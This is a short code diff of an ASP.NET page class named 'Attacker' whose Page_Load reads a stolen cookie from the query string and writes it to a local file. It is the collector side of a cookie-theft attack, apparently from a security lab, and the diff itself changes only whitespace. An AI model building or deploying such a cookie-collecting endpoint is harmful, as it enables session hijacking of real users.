@@ -9,7 +9,8 @@ using System.IO;
 public partial class Attacker : System.Web.UI.Page
 {
     protected void Page_Load(object sender, EventArgs e)
-    {       
+    {
+
         String cookie = Request.QueryString.Get("Cookie");
         String filename = "C:\\Users\\haozhenxiao\\Desktop\\Attack\\cookie.txt";
         System.IO.StreamWriter file = new System.IO.StreamWriter(filename);
